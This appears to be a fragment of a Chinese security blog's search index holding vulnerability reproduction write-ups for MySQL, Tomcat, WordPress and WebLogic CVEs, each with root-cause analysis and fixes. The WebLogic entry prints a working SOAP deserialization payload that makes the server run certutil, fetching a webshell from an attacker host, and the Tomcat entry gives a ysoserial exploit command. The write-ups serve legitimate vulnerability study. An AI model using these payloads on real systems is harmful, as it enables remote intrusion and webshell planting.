+    <url>/archives/e5fd1c70.html</url>
+    <content><![CDATA[<p>针对MySQL / MariaDB / PerconaDB - 提权/条件竞争漏洞进行复现并分析。<br><img data-src="https://i.loli.net/2018/05/29/5b0d484a0d66a.png" alt="success.png"></p>
+<a id="more"></a>
+<h1 id="漏洞简述"><a href="#漏洞简述" class="headerlink" title="漏洞简述"></a>漏洞简述</h1><p>存在条件竞争漏洞，导致本地用户使用低权限帐号提升到数据库系统用户。</p>
+<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><p>查看数据库版本:mysql -V。<br><img data-src="https://i.loli.net/2018/05/29/5b0d489f8ad05.png" alt="version.png"><br>建立低权限数据库用户，并新建库。<br><img data-src="https://i.loli.net/2018/05/29/5b0d48bf99c39.png" alt="user.png"><br><img data-src="https://i.loli.net/2018/05/29/5b0d48bf5c145.png" alt="db.png"><br><span class="exturl" data-url="aHR0cDovL2xlZ2FsaGFja2Vycy5jb20vYWR2aXNvcmllcy9NeVNRTC1NYXJpYS1QZXJjb25hLVByaXZFc2NSYWNlLUNWRS0yMDE2LTY2NjMtNTYxNi1FeHBsb2l0Lmh0bWw=">下载CVE-2016-6663 POC<i class="fa fa-external-link-alt"></i></span>，并编译。<br><img data-src="https://i.loli.net/2018/05/29/5b0d490686b2d.png" alt="download poc.png"><br>查看当前用户id.<br><img data-src="https://i.loli.net/2018/05/29/5b0d491b8fad2.png" alt="user id.png"><br>运行CVE-2016-6663 POC。<br><img data-src="https://i.loli.net/2018/05/29/5b0d493ed9890.png" alt="run poc.png"><br>下载CVE-2016-6664 POC 并更改权限。<br><img data-src="https://i.loli.net/2018/05/29/5b0d495c31081.png" alt="run 2.png"><br>运行CVE-2016-6664 POC。</p>
+<h2 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h2><p>MySQL数据库可以通过data directory指定存储目录，并将目录权限更改为mysql。<br><img data-src="https://i.loli.net/2018/05/29/5b0d497dafba7.png" alt="data.png"><br><img data-src="https://i.loli.net/2018/05/29/5b0d4996a0680.png" alt="directory.png"></p>
+<h2 id="复现注意事项"><a href="#复现注意事项" class="headerlink" title="复现注意事项"></a>复现注意事项</h2><p>缺少mysql.h，安装libmysqlclient-dev。<br><img data-src="https://i.loli.net/2018/05/29/5b0d49c2a0e6a.png" alt="libmysqlclient-dev.png"></p>
+<h1 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h1><ol>
+<li>升级MySQL；</li>
+<li>在my.cnf中添加：symbolic-links = 0。</li>
+</ol>
+]]></content>
+      <categories>
+        <category>安全研究</category>
+      </categories>
+      <tags>
+        <tag>漏洞分析</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>CVE-2016-8735分析</title>
+    <url>/archives/c77f03de.html</url>
+    <content><![CDATA[<p>针对CVE-2016-8735复现并分析。<br><img data-src="https://i.loli.net/2018/05/30/5b0e433658076.png" alt="success.png"></p>
+<a id="more"></a>
+<h1 id="漏洞简述"><a href="#漏洞简述" class="headerlink" title="漏洞简述"></a>漏洞简述</h1><p>Tomcat启动JmxRemoteLifecycleListener监听器，在/conf/server.xml中添加<Listener className="org.apache.catalina.mbeans.JmxRemoteLifecycleListener" rmiRegistryPortPlatform="10001" rmiServerPortPlatform="10002" />Tomcat默认未开启JmxRemoteLifecycleListener监听器。在实际环境中，使用zabbix（是一个基于WEB界面的提供分布式系统监视以及网络监视功能的企业级的开源解决方案）通过JMX监控tomcat即会产生该漏洞环境。</p>
+<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">java</span> -cp ysoserial-<span class="number">0</span>.<span class="number">0</span>.<span class="number">5</span>-SNAPSHOT-<span class="literal">all</span>.jar ysoserial.exploit.RMIRegistryExploit localhost <span class="number">10001</span> Groovy<span class="number">1</span> calc.exe</span><br></pre></td></tr></table></figure>
+<p><img data-src="https://i.loli.net/2018/05/30/5b0e43a478dc9.png" alt="command.png"></p>
+<h2 id="POC分析"><a href="#POC分析" class="headerlink" title="POC分析"></a>POC分析</h2><p>根据攻击命令发现攻击函数为RMIRegistryExploit在ysoserial-0.0.5-SNAPSHOT-all.jar包中的ysoserial.exploit中。通过解压缩软件将RMIRegistryExploit从ysoserial-0.0.5-SNAPSHOT-all.jar解压出来。由于解压出来为class，对其进行反编译。<br><img data-src="https://i.loli.net/2018/05/30/5b0e440d9b0d7.png" alt="1.png"><br>第13行定义了RMIRegistryExploit类，第20行需传递一个数组，21行抛出Exception异常类型。<br><img data-src="https://i.loli.net/2018/05/30/5b0e442579ebc.png" alt="2.png"><br>第23行-25行定义了host为数组的第一位数值，port（int）为数组的第二位数值（通过Integer.parseInt将整形对象转换成int型），command为数组的第三位数值。<br><img data-src="https://i.loli.net/2018/05/30/5b0e443c27aed.png" alt="3.png"><br>在26行使用java.rmi.registry.LocateRegistry中的LocateRegistry.getRegistry方法来返回对Registry对象的引用。<img data-src="https://i.loli.net/2018/05/30/5b0e444fa93f7.png" alt="4.png"><br>在27行定义一个string 名字为className，通过StringBuilder创建一个新实例（结合后面代码中的append可发现用于快速进行字符相加），并获取CommonsCollections1的包的名字，最后把待执行的命令加上包的名字整体作为string赋值给className。28行获得该类(className)并初始化该类。<br><img data-src="https://i.loli.net/2018/05/30/5b0e4466de818.png" alt="5.png"><br>第29行执行exploit.warp，传递三个参数；第35行使用ExecCheckingSecurityManager的wrap并传一个对象，该对象包含三个参数（payloadClass、command、registry），跟踪ExecCheckingSecurityManager（ysoserial.secmgr.ExecCheckingSecurityManager）查看warp的作用（用于并发）。<br><img data-src="https://i.loli.net/2018/05/30/5b0e447fd6e8d.png" alt="6.png"><br>倒回去看RMIRegistryExploit.java，className来源于CommonsCollections1，跟踪CommonsCollections1类（ysoserial.payloads. CommonsCollections1），该类继承了PayloadRunner。<br><img data-src="https://i.loli.net/2018/05/30/5b0e449736dab.png" alt="7.png"><br>跟踪PayloadRunner（ysoserial.payloads.util. PayloadRunner）的run方法，在第22行发现该方法将传进来的args、clazz并发设为新对象并转换成byte。<br><img data-src="https://i.loli.net/2018/05/30/5b0e44ad5b96b.png" alt="8.png"><br>第29行使用Deserializer.deserialize将serialized反序列化赋值为对象obj。<br><img data-src="https://i.loli.net/2018/05/30/5b0e44ceb5e6d.png" alt="9.png"><br>倒回去看CommonsCollections1，第41行到53行，用Transformer创建了transformers数组，数组中按顺序包含了ConstantTransformer、InvokerTransformer、InvokerTransformer、InvokerTransformer、ConstantTransformer对象。<br><img data-src="https://i.loli.net/2018/05/30/5b0e44ecea5c2.png" alt="10.png"><br>ConstantTransformer获取其构造函数中传入的类；InvokerTransformer执行其构造函数中传入的方法。<br>跟踪transformers，第58行使用Reflections.setFieldValue();方法：利用反射机制，将transformerChain对象的iTransformers属性赋值为transformers。<br><img data-src="https://i.loli.net/2018/05/30/5b0e450509c5f.png" alt="11.png"></p>
+<h1 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h1><ol>
+<li>升级Tomcat</li>
+<li>改变JMX密码认证</li>
+</ol>
+]]></content>
+      <categories>
+        <category>安全研究</category>
+      </categories>
+      <tags>
+        <tag>漏洞分析</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>CVE-2017-5487分析</title>
+    <url>/archives/5a5cf5bb.html</url>
+    <content><![CDATA[<p>针对Content Injection Vulnerability in WordPress进行复现并分析。<br><img data-src="https://i.loli.net/2018/05/31/5b0f887805634.png" alt="success.png"></p>
+<a id="more"></a>
+<h1 id="漏洞简述"><a href="#漏洞简述" class="headerlink" title="漏洞简述"></a>漏洞简述</h1><p>由于WordPress4.7.0-4.7.1REST API接口权限判断不合理导致命令注入。</p>
+<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><p><span class="exturl" data-url="aHR0cHM6Ly9naXN0LmdpdGh1Yi5jb20vbGVvbmp6YS8yMjQ0ZWIxNTUxMGEwNjg3ZWQ5MzE2MGM2MjM3NjJhYg==">下载<i class="fa fa-external-link-alt"></i></span>POC脚本，运行即可。</p>
+<h2 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h2><p>查看/wp-includes/rest-api/endpoints/class-wp-rest-posts-controller.php的第90行，发现参数ID的值会被过滤成数字。发现REST API在管理访问时，其会在正则表达式之前优先考虑$_GET和$_POST的值。例如: /wp-json/wp/v2/posts/1234?id=12345helloworld，REST API会将其ID参数设置成12345helloworld。<br>在99行使用了update_item和update_item_permissions_check。<br><img data-src="https://i.loli.net/2018/05/31/5b0f89783224b.png" alt="1.png"><br>查看593行的update_item_permissions_check函数，其将ID值传递给get_post()函数。这个函数功能用来检查帖子是否存在、是否有权限。如果发送的ID没有对应的post，就可以绕过权限检查，并允许继续执行update_item方法。<br><img data-src="https://i.loli.net/2018/05/31/5b0f899d3b8fa.png" alt="2.png"><br>由于使用get_instance()静态方法来获取post，造成get_post()在特定情况下无法找到对应的ID。<br>查看/wordpress/wp-includes/class-wp-post.php第210行，发现需全部使用数字，例如123ABC将会导致获取post失败。有一个细节，其会将ID参数在传递给get_post之前会将其转换成整数。<br><img data-src="https://i.loli.net/2018/05/31/5b0f89b300743.png" alt="3.png"><br>PHP语言中做类型的比较和转换时，其会返回整数。例如<br><img data-src="https://i.loli.net/2018/05/31/5b0f89c229bd3.png" alt="4.png"><br>例如提交一个请求为/wp-json/wp/v2/posts/123?id=456ABC，PHP会将其ID返回456。由于456ABC并不是纯数字会导致/wordpress/wp-includes/class-wp-post.php获取post_id失败。在流程进入权限检查时update_item_permissions_check判断其没有对应的post绕过权限判断，进行更新操作update_item。最终导致ID为456被修改。<br>在受影响的WordPress版本中REST API接口是默认开放的。任何用户都可以利用该漏洞修改任意文章，只需要指定修改文章的ID即可。<br>修改前：<br><img data-src="https://i.loli.net/2018/05/31/5b0f89dc0e3d0.png" alt="5.png"><br>修改后：<br><img data-src="https://i.loli.net/2018/05/31/5b0f89edabed6.png" alt="6.png"></p>
+<h2 id="复现注意事项"><a href="#复现注意事项" class="headerlink" title="复现注意事项"></a>复现注意事项</h2><p>在复现时如果遇到id is not of type integer报错信息，有可能是因为版本不对。最新版本的4.7.2已经对该漏洞进行修复。<br><img data-src="https://i.loli.net/2018/05/31/5b0f8a0db7ddf.png" alt="11.png"><br><img data-src="https://i.loli.net/2018/05/31/5b0f8a19c8a8a.png" alt="12.png"></p>
+<h1 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h1><p>升级WordPress至4.7.2及以上。</p>
+]]></content>
+      <categories>
+        <category>安全研究</category>
+      </categories>
+      <tags>
+        <tag>漏洞分析</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>weblogic wls9-async rce复现&amp;分析</title>
+    <url>/archives/94f70d04.html</url>
+    <content><![CDATA[<p>针对Weblogic wls9-async反序列化进行漏洞环境搭建及复现。</p>
+<p><img data-src="https://i.loli.net/2019/04/25/5cc10d1a6ddfd.png" alt="success.png"></p>
+<p><img data-src="https://i.loli.net/2019/04/25/5cc10d1f59bf8.png" alt="webshell"></p>
+<!--more  -->
+
+<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>服务器需要安装jdk,这里采用1.7版本。</p>
+<p>在<span class="exturl" data-url="aHR0cHM6Ly93d3cub3JhY2xlLmNvbS90ZWNobmV0d29yay9taWRkbGV3YXJlL3dlYmxvZ2ljL2Rvd25sb2Fkcy93bHMtbWFpbi0wOTcxMjcuaHRtbA==">Oracle官网<i class="fa fa-external-link-alt"></i></span>下载对应版本,这里使用的12.1.3(10.x版本也可以的)。</p>
+<p><a href="https://i.loli.net/2019/04/25/5cc10e75259ba.png"><img data-src="https://i.loli.net/2019/04/25/5cc10e75259ba.png" alt="oracle-download.png"></a></p>
+<p>下载完成之后，通过<code>java -jar fmw_12.1.3.0.0_wls.jar</code>启动安装程序，默认安装即可。安装完成之后启动weblogic。</p>
+<p><a href="https://i.loli.net/2019/04/25/5cc10f794723e.png"><img data-src="https://i.loli.net/2019/04/25/5cc10f794723e.png" alt="weblogic-start.png"></a></p>
+<p>通过浏览器访问查看服务是否启动。</p>
+<p><a href="https://i.loli.net/2019/04/25/5cc10fb8dade5.png"><img data-src="https://i.loli.net/2019/04/25/5cc10fb8dade5.png" alt="weblogic-bro.png"></a></p>
+<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>在攻击机上通过python启动一个web服务，该目录下放一个webshell。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python -m SimpleHTTPServer <span class="number">80</span> <span class="comment"># python2</span></span><br><span class="line">python3 -m http.server <span class="comment"># python3</span></span><br></pre></td></tr></table></figure>
+
+<p>由于是soap，先访问一下<span class="exturl" data-url="aHR0cDovL2lwOnBvcnQvX2FzeW5jL0FzeW5jUmVzcG9uc2VTZXJ2aWNlP1dTREw=">http://ip:port/_async/AsyncResponseService?WSDL<i class="fa fa-external-link-alt"></i></span> ，看下格式结构。</p>
+<p><a href="https://i.loli.net/2019/04/25/5cc1105a91737.png"><img data-src="https://i.loli.net/2019/04/25/5cc1105a91737.png" alt="weblogic-wsdl.png"></a></p>
+<p>通过SOAP-UI进行请求构建，新建一个soap，在Initial WSDL输入刚刚的url。</p>
+<p><a href="https://i.loli.net/2019/04/25/5cc110c956692.png"><img data-src="https://i.loli.net/2019/04/25/5cc110c956692.png" alt="weblogic-soap.png"></a></p>
+<p>新建一个request请求。</p>
+<p><a href="https://i.loli.net/2019/04/25/5cc111862585f.png"><img data-src="https://i.loli.net/2019/04/25/5cc111862585f.png" alt="new-requests.png"></a></p>
+<p>将下列代码贴进请求包中，需要注意的是string标签下面的ip、port、webshell.txt这些需要按照自己的环境进行修改。我的攻击机ip为192.168.100.5 port为80 webshell.txt为cmd.txt。</p>
+<p>上传的路径：</p>
+<p>12版本<code>servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.bea-wls9-async-response_12.1.3/2ig01a/war/</code></p>
+<p>10版本<code>servers/AdminServer/tmp/_WL_internal/bea_wls9_async_response/8tpkys/war/</code>。</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">soapenv:Envelope</span> <span class="attr">xmlns:soapenv</span>=<span class="string">&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span> <span class="attr">xmlns:wsa</span>=<span class="string">&quot;http://www.w3.org/2005/08/addressing&quot;</span> <span class="attr">xmlns:asy</span>=<span class="string">&quot;http://www.bea.com/async/AsyncResponseService&quot;</span>&gt;</span>   </span><br><span class="line">	<span class="tag">&lt;<span class="name">soapenv:Header</span>&gt;</span> </span><br><span class="line">		<span class="tag">&lt;<span class="name">wsa:Action</span>&gt;</span>xx<span class="tag">&lt;/<span class="name">wsa:Action</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">wsa:RelatesTo</span>&gt;</span>xx<span class="tag">&lt;/<span class="name">wsa:RelatesTo</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">work:WorkContext</span> <span class="attr">xmlns:work</span>=<span class="string">&quot;http://bea.com/2004/06/soap/workarea/&quot;</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">void</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">array</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.String&quot;</span> <span class="attr">length</span>=<span class="string">&quot;3&quot;</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">&quot;0&quot;</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">string</span>&gt;</span>cmd<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">&quot;1&quot;</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">string</span>&gt;</span>/c<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">&quot;2&quot;</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">string</span>&gt;</span>certutil -urlcache -split -f http://192.168.100.5/cmd.txt servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.bea-wls9-async-response_12.1.3/2ig01a/war/cmd.jsp<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">array</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">&quot;start&quot;</span>/&gt;</span><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">work:WorkContext</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">soapenv:Header</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">soapenv:Body</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">asy:onAsyncDelivery</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">soapenv:Body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">soapenv:Envelope</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>点击request窗口的发送请求按钮，可以看到攻击机上的python web服务有访问请求，说明文件已经成功上传到服务器上。</p>
+<p><a href="https://i.loli.net/2019/04/25/5cc11477bda21.png"><img data-src="https://i.loli.net/2019/04/25/5cc11477bda21.png" alt="python-httpserver.png"></a></p>
+<p>通过蚁剑或菜刀连接即可。</p>
+<p><img data-src="https://i.loli.net/2019/04/25/5cc10d1a6ddfd.png" alt="success.png"></p>
+<p><img data-src="https://i.loli.net/2019/04/25/5cc10d1f59bf8.png" alt="webshell"></p>
+<h1 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h1><p>使用JD-GUI打开对应War包。</p>
+<figure class="highlight crystal"><table><tr><td class="code"><pre><span class="line"><span class="symbol">Weblogic9:</span></span><br><span class="line">/%WLS_HOME%<span class="regexp">/weblogic92/server</span><span class="regexp">/lib/bea</span>_wls9_async_response.war</span><br><span class="line"></span><br><span class="line">Weblogic <span class="number">10</span>:</span><br><span class="line">/%WLS_HOME%<span class="regexp">/wlserver_10.3/server</span><span class="regexp">/lib/bea</span>_wls9_async_response.war</span><br><span class="line"></span><br><span class="line"><span class="symbol">Weblogic12:</span></span><br><span class="line">/%WLS_HOME%<span class="regexp">/oracle_common/modules</span><span class="regexp">/com.oracle.webservices.wls.bea-wls9-async-response_12.1.3.war</span></span><br><span class="line"><span class="regexp"></span></span><br></pre></td></tr></table></figure>
+
+<p>在web.xml里面可以看到基本都是指向<code>weblogic.wsee.async.AsyncResponseBean</code></p>
+<p><img data-src="https://i.loli.net/2019/04/25/5cc18b223d1a4.png" alt="web-xml.png"></p>
+<p>跟进<code>weblogic.wsee.async.AsyncResponseBean</code>，可以得知有两个函数handleResult、handleFault。查看<span class="exturl" data-url="aHR0cHM6Ly9kb2NzLm9yYWNsZS5jb20vbWlkZGxld2FyZS8xMjIxMy93bHMvV0xBUEkvd2VibG9naWMvd3NlZS9hc3luYy9Bc3luY1Jlc3BvbnNlQmVhbi5odG1s">oracle官方<i class="fa fa-external-link-alt"></i></span>对AsyncResponseBean类的描述，查看Method Detail,可以得知handleResult是当异步响应服务收到对请求正常时调用，handleFault是异常时调用。</p>
+<p>根据官方文档可以得知AsyncResponseBean继承AbstractAsyncResponseBean类(<code>%WLS_HOME%/server/lib/weblogic.jar</code>)。在weblogic.wsee.async找到该类。</p>
+<p><img data-src="https://i.loli.net/2019/04/25/5cc1a3cf32429.png" alt="weblogic-abstractasync.png"></p>
+<p>由于不了解weblogic逻辑处理流程，根据查阅的资料所得：该处会与AddressingHandler、AsyncResponseHandler、WorkAreaHandler有关。</p>
+<p>其中WorkAreaHandler被WorkAreaServerHandler和WorkAreaClientHandler继承，而WorkAreaServerHandler的27行处<code>localWorkContextMapInterceptor.receiveRequest(**new** WorkContextXmlInputAdapter(localWorkAreaHeader.getInputStream()));</code>可以看到接受请求用到了WorkContextXmlInputAdapter。</p>
+<p><img data-src="https://i.loli.net/2019/04/25/5cc1a9a55c1b0.png" alt="requests.png"></p>
+<p>跟进该类可以发现该类imoprt了XMLDecoder，而且并没有做过滤。XMLDecoder是用来将XML文件反序列化成java对象。</p>
+<p><img data-src="https://i.loli.net/2019/04/25/5cc1a96f84381.png" alt="XMLDecoder.png"></p>
+<h1 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h1><p>1.删除对应war包；</p>
+<p>2.禁用bea_wls9_async_response组件。</p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这次分析还有存在疑难点：weblogic整体的逻辑处理流程是如何，这个需要后续是多了解。</p>
+]]></content>
+      <categories>
+        <category>安全研究</category>
+      </categories>
+      <tags>
+        <tag>漏洞分析</tag>
       </tags>
   </entry>
   <entry>
